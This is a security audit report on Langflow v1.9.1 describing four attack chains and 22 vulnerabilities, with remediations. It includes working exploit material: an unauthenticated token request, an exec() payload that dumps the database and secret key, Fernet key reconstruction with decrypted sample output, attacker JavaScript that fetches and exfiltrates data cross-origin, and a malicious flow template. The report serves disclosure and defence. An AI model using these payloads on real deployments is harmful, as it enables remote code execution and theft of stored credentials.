# Langflow Security Audit Report

**Date:** 2026-04-25 | **Target:** Langflow v1.9.1 | **Commit:** 501ef6f | **Classification:** CONFIDENTIAL

---

## Executive Summary

From zero credentials to every stored credential decrypted — confirmed end-to-end against a live Langflow v1.9.1 instance. This audit identified 22 findings (4 Critical, 12 High, 6 Medium) composing 4 independent attack chains, all confirmed live. Defense-in-depth fails at all 8 layers: authentication, authorization, input validation, execution sandboxing, network protection, frontend sanitization, token management, and cryptography. Disabling `AUTO_LOGIN` does not prevent compromise — any active user account (including the always-created default `langflow/langflow` superuser) reaches full Remote Code Execution via the same unsandboxed `exec()` path, then decrypts every API key stored in the database.

---

## Critical Attack Chains

### Chain 1: Default Config → Complete Credential Harvest

**Auth required:** None (default configuration)
**Vulns composed:** VULN-001, VULN-002, VULN-004
**Impact:** 0 credentials → every API key, password hash, and stored secret in the system

```
ATTACKER (no credentials)
    │
    ▼
GET /api/v1/auto_login
    │  no auth check, default AUTO_LOGIN=True
    ▼
Superuser JWT (365-day)
    │
    ▼
POST /api/v1/custom_component  ←── ast.Assign payload
    │  prepare_global_scope() → exec()
    ├──▶ Open SQLite: /app/.venv/lib/python3.12/site-packages/langflow/langflow.db
    │       user table   → bcrypt hashes of all user passwords
    │       variable table → Fernet-encrypted API keys
    ├──▶ Read env: LANGFLOW_SECRET_KEY=langflow
    └──▶ Reconstruct Fernet key → decrypt all stored API keys → plaintext
```

**Step 1 — Unauthenticated superuser token:**
```
GET /api/v1/auto_login HTTP/1.1
Host: target:7860
```
Returns a 365-day superuser JWT with no credentials. No rate-limiting, no audit log entry.

**Step 2 — RCE via ast.Assign payload:**
```python
# POST /api/v1/custom_component
# Body: {"code": "<payload>"}
# Only ast.Assign, ast.Import nodes survive prepare_global_scope() filtering

import os, json, sqlite3

_sk = os.environ.get("LANGFLOW_SECRET_KEY", "langflow")
_db = "/app/.venv/lib/python3.12/site-packages/langflow/langflow.db"
_conn = sqlite3.connect(_db)
_users = _conn.execute("SELECT username, password, is_superuser FROM user").fetchall()
_vars = _conn.execute("SELECT name, value, type FROM variable").fetchall()
_dump = json.dumps({"sk": _sk, "users": _users, "vars": _vars})
```

**Step 3 — Offline Fernet key reconstruction and decryption:**
```python
import random, base64
random.seed("langflow")          # SECRET_KEY="langflow" (default)
key = base64.urlsafe_b64encode(bytes(random.getrandbits(8) for _ in range(32)))
# → b'R-KBaWyIbRcHX_NjyOIUCW0JjZFvVVJntidEFekl8VA='

from cryptography.fernet import Fernet
plaintext = Fernet(key).decrypt(b"gAAAAABp7Qbl4Ivr56UFg...")
# → b'sk--P-rdzcp01_Xm8CRhXklVPEbfx-KZJ0Po1eCELlxzdw'
```

**Confirmed live output:**
```
Superuser bcrypt hash:    $2b$12$6VnHdGgyyA3okqN0UeSQGeIwtkdaiaw1cLQyz90PzGTdNxNMtaUAy
Fernet-encrypted API key: gAAAAABp7Qbl4Ivr56UFgChrhv7SpXXJZZ7B9FvAnPKUVjR-ZLOtGab_YuUiXOSI3MD0LMBF2ukem2IojeJgnf8fA0FFyATwr6MCesMfufZwZQDsGyJJLEkHFIBrFnjUVCoTmlRrtvsB
Reconstructed Fernet key: R-KBaWyIbRcHX_NjyOIUCW0JjZFvVVJntidEFekl8VA=
Decrypted API key:         sk--P-rdzcp01_Xm8CRhXklVPEbfx-KZJ0Po1eCELlxzdw
```

**PoC:** `exploit_db_decrypt.py --url http://target:7860`

---

### Chain 2: Any User Account → Complete Credential Harvest (AUTO_LOGIN=false)

**Auth required:** Any active user account
**Vulns composed:** VULN-021, VULN-002, VULN-004, VULN-006
**Impact:** Standard account → every credential in the system. Disabling AUTO_LOGIN is ineffective.

```
ATTACKER (any account)
    │
    ▼
POST /api/v1/login  (form-encoded: username=langflow&password=langflow)
    │  default superuser always created on startup (constants.py)
    │  OR any registered account — registration has no auth gate (VULN-017)
    ▼
Standard user JWT
    │
    ▼
POST /api/v1/custom_component
    │  endpoint checks CurrentActiveUser — NOT superuser (endpoints.py:1060)
    │  scan_code_security() never called (VULN-006)
    │  allow_custom_components=True by default
    ▼
exec() → same outcome as Chain 1 (DB read → env exfil → Fernet decrypt)
```

**Why disabling AUTO_LOGIN does not help:**

| Defense attempted | Why it fails |
|---|---|
| `AUTO_LOGIN=false` | Default `langflow/langflow` creds still created on startup |
| Strong password for langflow user | Registration endpoint open, anyone can create an account |
| Revoke all user accounts | `/api/v1/custom_component` only requires `CurrentActiveUser` — any active user |
| Allow custom components only for trusted users | No per-user control; it's a global flag |

**Confirmed output:** Identical to Chain 1 — standard user login then same exec() path, same DB access, same decryption.

**PoC:** `exploit_auth_user_rce.py --url http://target:7860`

---

### Chain 3: Drive-By Browser Attack via CORS → RCE

**Auth required:** Victim must be logged into Langflow and visit attacker's page
**Vulns composed:** VULN-009, VULN-002
**Impact:** Any website on the internet can execute arbitrary code on Langflow server through a logged-in victim's browser

```
ATTACKER WEBPAGE                    VICTIM BROWSER              LANGFLOW SERVER
     │                                    │                            │
     │  victim visits attacker site       │                            │
     │ ─────────────────────────────────▶ │                            │
     │                                    │                            │
     │  JS: fetch(langflow/api/v1/        │                            │
     │      custom_component,             │                            │
     │      {credentials: 'include'})     │                            │
     │                                    │ POST + victim's cookie ──▶ │
     │                                    │                            │ exec() RCE
     │                                    │ ◀── response ─────────── │
     │  JS reads response (CORS allows)   │                            │
     │ ◀───────────────────────────────── │                            │
     │                                    │                            │
   RCE output in attacker's JS
```

**Confirmed CORS headers — live server response to `Origin: https://evil-attacker.com`:**
```
# GET /api/v1/auto_login with Origin: https://evil-attacker.com
access-control-allow-origin: https://evil-attacker.com
access-control-allow-credentials: true

# OPTIONS /api/v1/custom_component preflight
access-control-allow-origin: https://evil-attacker.com
access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
access-control-allow-credentials: true
access-control-allow-headers: Content-Type,Authorization
```

**Attacker JavaScript (runs on any page the victim visits):**
```javascript
fetch('http://langflow-target:7860/api/v1/custom_component', {
  method: 'POST',
  credentials: 'include',          // sends victim's session cookie
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({code: RCE_PAYLOAD})
}).then(r => r.json()).then(data => {
  // CORS allows reading the response — attacker receives exec() output
  exfiltrate(data);
});
```

**Root cause:** `cors_origins = "*"` with `cors_allow_credentials = True` in `base.py:260-268`. FastAPI's CORS middleware reflects the incoming `Origin` header when credentials are involved, replacing `*` with the caller's exact origin.

**PoC:** `exploit_cors_rce.py --url http://target:7860` (also generates `cors_poc.html`)

---

### Chain 4: Supply Chain via Malicious Flow Import → RCE

**Auth required:** Any account that can import and run flows
**Vulns composed:** VULN-002, VULN-005, VULN-006
**Impact:** Distributing a flow JSON file achieves RCE on every victim who imports and runs it

```
ATTACKER                           VICTIM
    │                                 │
    │  craft flow JSON with           │
    │  malicious _code field          │
    │                                 │
    │  distribute via:                │
    │  - community hub                │
    │  - GitHub / Gist                │
    │  - social engineering           │
    │                                 │
    │ ────────────────────────────▶  │  Import via /api/v1/flows/upload/
    │                                 │  (no code execution on import)
    │                                 │
    │                                 │  Run flow
    │                                 │      │
    │                                 │      ▼
    │                                 │  instantiate_class() [loading.py:44]
    │                                 │      │
    │                                 │      ▼
    │                                 │  eval_custom_component_code()
    │                                 │      │
    │                                 │      ▼
    │                                 │  prepare_global_scope() → exec()
    │                                 │      │
    │                                 │  RCE with victim's session privileges
```

**Malicious flow structure:**
```json
{
  "flows": [{
    "name": "Totally Harmless Flow",
    "data": {
      "nodes": [{
        "data": {
          "node": {
            "template": {
              "code": {
                "value": "<malicious Python with ast.Assign RCE payload>"
              }
            }
          }
        }
      }]
    }
  }]
}
```

**Code path:** `loading.py:44` → `validate.py:248` (`eval_custom_component_code`) → `validate.py:470-473` (`prepare_global_scope` → `exec()`)

**Why no protection fires:**
- `allow_custom_components=True` (default) disables hash validation guard
- `scan_code_security()` is never called on the execution path (VULN-006)
- No sandbox, no subprocess isolation, no env var filtering

**PoC:** `exploit_flow_import.py --url http://target:7860`

---

## Individual Vulnerability Reference

| ID | Title | Severity | CVSS | Affected File:Line | In Chain |
|----|-------|----------|------|--------------------|----------|
| VULN-001 | Unauthenticated Superuser Token via AUTO_LOGIN | CRITICAL | 9.8 | `login.py:96` | 1 |
| VULN-002 | RCE via /api/v1/custom_component exec() | CRITICAL | 9.8 | `validate.py:473` | 1, 2, 3, 4 |
| VULN-003 | RCE via /api/v1/validate/code | HIGH | 8.8 | `validate.py:61` | — |
| VULN-004 | Deterministic Fernet Key via random.seed() | CRITICAL | 8.1 | `auth/utils.py:329` | 1, 2 |
| VULN-005 | Python REPL Component — Unsandboxed Execution | HIGH | 8.8 | `python_repl_core.py:72` | 4 |
| VULN-006 | scan_code_security() Not Called on User Code | HIGH | 8.1 | `endpoints.py:1084` | 2, 4 |
| VULN-007 | Access Token Stored in localStorage | HIGH | 7.4 | `authContext.tsx:74` | — |
| VULN-008 | ACCESS_HTTPONLY=False Default | HIGH | 6.8 | `auth.py:111` | — |
| VULN-009 | CORS Wildcard Origin Reflection with Credentials | HIGH | 7.1 | `base.py:260` | 3 |
| VULN-010 | Hardcoded Access-Control-Allow-Origin: \* on SSE | HIGH | 6.5 | `openai_responses.py:450` | — |
| VULN-011 | ~~Open Redirect~~ | N/A | N/A | — | False positive — retracted. React Router `Navigate` cannot redirect to external URLs. |
| VULN-012 | Unvalidated getattr ORDER BY Injection | HIGH | 6.5 | `monitor.py:112` | — |
| VULN-013 | Full Stack Traces Returned to Clients | HIGH | 5.3 | `build.py:366` | — |
| VULN-014 | Pickle Deserialization in DiskCache | HIGH | 7.8 | `cache/disk.py:38` | — |
| VULN-015 | Raw Exception Messages in 500 Responses | MEDIUM | 5.3 | `monitor.py:117` | — |
| VULN-016 | MCP Endpoints Fall Back to Superuser | MEDIUM | 5.9 | `mcp.py:146` | — |
| VULN-017 | Unauthenticated Registration Endpoint | MEDIUM | 5.3 | `users.py` | — |
| VULN-018 | No File Content Validation on Upload | MEDIUM | 5.3 | `files.py` | — |
| VULN-019 | Markdown Rendered Without rehypeSanitize | MEDIUM | 4.7 | `ContentDisplay.tsx:32` | — |
| VULN-020 | Missing Security Headers (CSP, X-Frame-Options) | MEDIUM | 4.3 | Middleware | — |
| VULN-021 | Any-User Custom Component RCE (No Superuser Check) | CRITICAL | 9.1 | `endpoints.py:1060` | 2 |
| VULN-022 | SSRF Protection Bypassed via warn_only=True | HIGH | 7.5 | `api_request.py:456` | — |
| VULN-023 | XSS → Token Theft → RCE (Three-Layer Failure) | HIGH | 7.1 | `ContentDisplay.tsx`, `authContext.tsx` | — |

### Additional Vulnerability Details

*(Vulns covered in chains above need no further detail. The following are not part of any chain.)*

**VULN-003 — RCE via /api/v1/validate/code**
`validate.py:61-70` compiles and `exec()`s every `ast.FunctionDef` in submitted code. Python evaluates default argument expressions at definition time — `def f(x=__import__("os").popen("id").read()):` exfiltrates data via the caught exception string returned in the response.
*Remediation:* Remove `exec()` from validation; perform all checks via AST analysis only.

```python
# validate.py:61-70
for node in tree.body:
    if isinstance(node, ast.FunctionDef):
        code_obj = compile(ast.Module(body=[node], type_ignores=[]), "<string>", "exec")
        try:
            exec(code_obj, exec_globals)        # default args execute here
        except Exception as e:
            errors["function"]["errors"].append(str(e))   # returned to caller
```

**VULN-007 — Access Token in localStorage**
`authContext.tsx:74` calls `setLocalStorage(LANGFLOW_ACCESS_TOKEN, newAccessToken)` in addition to the cookie. Any XSS payload on the Langflow origin reads it: `localStorage.getItem('access_token_lf')`.
*Remediation:* Remove the `localStorage` write. Use the `httpOnly` cookie exclusively.

**VULN-008 — ACCESS_HTTPONLY=False Default**
`auth.py:111`: `ACCESS_HTTPONLY: bool = False`. The session cookie is readable by JavaScript via `document.cookie`, independent of VULN-007.
*Remediation:* Default `ACCESS_HTTPONLY=True` and `ACCESS_SECURE=True`.

**VULN-010 — Hardcoded ACAO: \* on SSE Endpoint**
`openai_responses.py:450-454` sets `"Access-Control-Allow-Origin": "*"` directly in `StreamingResponse` headers, bypassing the application CORS config. Any origin can read the SSE stream.
*Remediation:* Remove the hardcoded header; let CORS middleware handle it.

**VULN-012 — Unvalidated getattr ORDER BY Injection**
`monitor.py:112-114`: `getattr(MessageTable, order_by).asc()` with no allowlist. Any authenticated user can probe model columns; non-existent names trigger `AttributeError` leaked in the 500 body.
*Remediation:* Allowlist: `ALLOWED_ORDER_COLUMNS = {"timestamp", "sender", "sender_name"}`.

**VULN-013 — Stack Traces Leaked to Clients**
`build.py:366-374` returns `{"stackTrace": tb}` to the caller on every unhandled exception, including full file paths, function names, and line numbers.
*Remediation:* Log tracebacks server-side only; return a correlation ID to callers.

**VULN-014 — Pickle Deserialization in DiskCache**
`cache/disk.py:38`: `pickle.loads(item["value"])` on bytes from disk. Writable cache directory (achievable via VULN-002 file write) allows injecting a malicious pickle payload.
*Remediation:* Replace pickle with JSON or msgpack.

**VULN-015 — Raw Exception Messages in 500 Responses**
40+ locations return `str(e)` or `repr(e)` as the HTTP response `detail`. Exception messages include SQL fragments, file paths, and internal identifiers.
*Remediation:* Global exception handler that logs full exceptions and returns only generic messages + correlation IDs.

**VULN-016 — MCP Endpoints Fall Back to Superuser**
`mcp.py:146-155`: zero auth on `POST /api/v1/mcp/`. `get_current_user_mcp` falls back to superuser when `AUTO_LOGIN=True` and no token is provided (`service.py:710-720`).
*Remediation:* Fail closed — unauthenticated MCP requests return `HTTP 401`, never grant elevated privilege.

**VULN-017 — Unauthenticated Registration Endpoint**
User registration accepts arbitrary sign-ups with no authentication or invitation token. Enables username squatting and provides the free account that powers Chain 2.
*Remediation:* Add a `LANGFLOW_ALLOW_REGISTRATION` flag (default: `false`). Require admin invitation token or rate-limit with CAPTCHA.

**VULN-018 — No File Content Validation on Upload**
File uploads validate declared MIME type or extension only. Actual content (magic bytes) is not checked. A file named `data.csv` containing Python or a ZIP bomb is stored and later processed.
*Remediation:* Validate content with `python-magic`; enforce an allowlist of permitted content types and sizes.

**VULN-019 — Markdown Rendered Without rehypeSanitize**
`ContentDisplay.tsx:32-88` uses `rehypeMathjax` but not `rehypeSanitize`. Raw HTML in Markdown passes through unmodified. Contrast: `SanitizedMarkdown/index.tsx:68-73` correctly includes both plugins.
*Remediation:* Add `rehypeSanitize` to all `react-markdown` instances that render user-controlled content.

**VULN-020 — Missing Security Response Headers**
No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, or `Referrer-Policy` are set. Absent CSP widens blast radius of any XSS; absent `X-Frame-Options` enables clickjacking.
*Remediation:* Middleware setting `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and a restrictive CSP on all responses.

**VULN-022 — SSRF Protection Bypassed via warn_only=True**
`api_request.py:456-463` calls `validate_url_for_ssrf(url, warn_only=True)`. When `warn_only=True`, `ssrf_protection.py:376-383` catches `SSRFProtectionError`, logs a warning, and returns — the request proceeds. Setting `LANGFLOW_SSRF_PROTECTION_ENABLED=true` has no effect for flows using the `APIRequest` component. A `TODO` comment defers the fix to v2.0.
*Remediation:* Remove `warn_only=True` immediately. Default `ssrf_protection_enabled=True`.

```python
# ssrf_protection.py:376-383
except SSRFProtectionError as e:
    if warn_only:
        logger.warning("SSRF Protection Warning: %s [URL: %s]", str(e), url)
        return        # ← returns without raising; request proceeds
    raise             # ← never reached when warn_only=True
```

**VULN-023 — XSS → Token Theft → RCE**
Three independent failures compose a cross-user attack: (1) `ContentDisplay.tsx` lacks `rehypeSanitize`; (2) `ACCESS_HTTPONLY=False` makes the session cookie readable by JavaScript; (3) `authContext.tsx:74` also stores the JWT in `localStorage`. Any JavaScript executing on the Langflow origin — from XSS, MathJax injection, or supply chain — steals the token from either path, then calls `/api/v1/custom_component` with it for RCE.
*Remediation:* Add `rehypeSanitize`, set `ACCESS_HTTPONLY=True`, remove the `localStorage` copy.

---

## Defense-in-Depth Failure

Every defensive layer is independently broken. No single fix prevents compromise.

| Layer | Expected Defense | Actual State | Finding |
|-------|-----------------|--------------|---------|
| **Authentication** | Require credentials to access the system | `AUTO_LOGIN=True` default issues superuser JWT with no credentials | VULN-001 |
| **Authorization** | Code execution requires elevated privilege | `/api/v1/custom_component` requires only `CurrentActiveUser` — any active user gets RCE | VULN-021 |
| **Input Validation** | User-submitted code is scanned before execution | `scan_code_security()` called on LLM-generated code only; never on user submissions | VULN-006 |
| **Execution Sandboxing** | Executed code runs in a restricted namespace | `exec()` in `prepare_global_scope()` runs with full process privileges; no seccomp, no isolation | VULN-002 |
| **Network** | SSRF protection blocks requests to internal/cloud endpoints | `ssrf_protection_enabled=False` by default; when enabled, `APIRequest` still passes all URLs (`warn_only=True`) | VULN-022 |
| **Frontend Sanitization** | XSS payloads sanitized before rendering | `ContentDisplay.tsx` lacks `rehypeSanitize`; inconsistent with `SanitizedMarkdown` which has it | VULN-019, VULN-023 |
| **Token Management** | Session tokens protected from JavaScript theft | `ACCESS_HTTPONLY=False` (cookie readable by JS) + `localStorage` storage = two independent theft paths | VULN-007, VULN-008 |
| **Cryptography** | Encryption keys generated from cryptographically random material | Fernet key derived via `random.seed(SECRET_KEY)` — deterministic, reconstructable from weak defaults | VULN-004 |

---

## Recommendations

### CRITICAL

1. **Default `AUTO_LOGIN=False`.** Require explicit `LANGFLOW_AUTO_LOGIN=true` env var opt-in for development only. (VULN-001)
2. **Add superuser check to `/api/v1/custom_component`.** `CurrentActiveUser` is insufficient; require superuser or a dedicated permission flag. (VULN-021)
3. **Disable `allow_custom_components` by default.** Make it an explicit operator opt-in with documented security implications. (VULN-002)
4. **Call `scan_code_security()` on all user-submitted code** before `exec()`. Reject with `HTTP 403` on any violation. (VULN-006)
5. **Replace `random.seed()` with a proper KDF** (`HKDF` or `PBKDF2HMAC`) for Fernet key derivation. Require `LANGFLOW_SECRET_KEY` ≥ 32 cryptographically random bytes. (VULN-004)

### HIGH

6. **Remove `exec()` from `/api/v1/validate/code`.** Validation must be AST-only — no code execution. (VULN-003)
7. **Replace pickle with JSON or msgpack in `DiskCache`.** (VULN-014)
8. **Set `ACCESS_HTTPONLY=True` and `ACCESS_SECURE=True` by default.** Remove the `localStorage` copy of the access token in `authContext.tsx`. (VULN-007, VULN-008)
9. **Remove `warn_only=True` from `api_request.py` immediately.** Default `ssrf_protection_enabled=True`. Apply consistent SSRF checking across all HTTP-making components. (VULN-022)
10. **Restrict CORS.** Default `cors_origins=[]`. Remove the hardcoded `Access-Control-Allow-Origin: *` from `openai_responses.py`. (VULN-009, VULN-010)
11. **Add `LANGFLOW_ALLOW_REGISTRATION` flag** defaulting to `false`. Add default superuser credential rotation enforcement on first login. (VULN-017)
12. **Add `rehypeSanitize`** to all `react-markdown` instances displaying user-controlled content. (VULN-019, VULN-023)

### MEDIUM

13. **Add security response headers middleware**: `Content-Security-Policy`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. (VULN-020)
14. **Sanitize error responses.** Replace bare `str(e)` with a generic message + correlation ID. Log full exceptions server-side. (VULN-015)
15. **Add `ORDER BY` column allowlist** in `monitor.py`. (VULN-012)
16. **Validate file content (magic bytes)** on upload endpoints. Enforce strict MIME type allowlist. (VULN-018)
17. **Fail closed on MCP auth.** Remove superuser fallback; unauthenticated MCP requests must return `HTTP 401`. (VULN-016)

---

## Appendix: Reproduction

**Environment:**
```bash
# Start Langflow v1.9.1 test container
./setup.sh

# Tear down
./teardown.sh
```

**PoC Scripts:**

| Script | What it proves | Usage |
|--------|---------------|-------|
| `exploit_db_decrypt.py` | Chain 1: zero creds → every credential decrypted | `python3 exploit_db_decrypt.py --url http://localhost:7860` |
| `exploit_auth_user_rce.py` | Chain 2: standard account → full compromise | `python3 exploit_auth_user_rce.py --url http://localhost:7860` |
| `exploit_cors_rce.py` | Chain 3: CORS enables zero-click browser RCE | `python3 exploit_cors_rce.py --url http://localhost:7860` |
| `cors_poc.html` | Chain 3: browser-side attack page | Open in browser while logged into Langflow |
| `exploit_flow_import.py` | Chain 4: malicious flow import → RCE | `python3 exploit_flow_import.py --url http://localhost:7860` |
| `exploit_chain_rce.py` | Chain 1 end-to-end (unauthenticated) | `python3 exploit_chain_rce.py --url http://localhost:7860` |
| `exploit_validate_code.py` | VULN-003: validate/code RCE via default args | `python3 exploit_validate_code.py --url http://localhost:7860` |
| `exploit_fernet_key.py` | VULN-004: Fernet key reconstruction (offline) | `python3 exploit_fernet_key.py` |
| `exploit_ssrf_cloud.py` | VULN-022: SSRF protection bypass | `python3 exploit_ssrf_cloud.py --url http://localhost:7860` |
| `exploit_xss_to_rce.py` | VULN-023: XSS token theft analysis | `python3 exploit_xss_to_rce.py --url http://localhost:7860` |

---

*AutoFyn Security Audit — All findings confirmed in a controlled test environment. Exploitation was limited to the authorized test container. No production systems were accessed.*
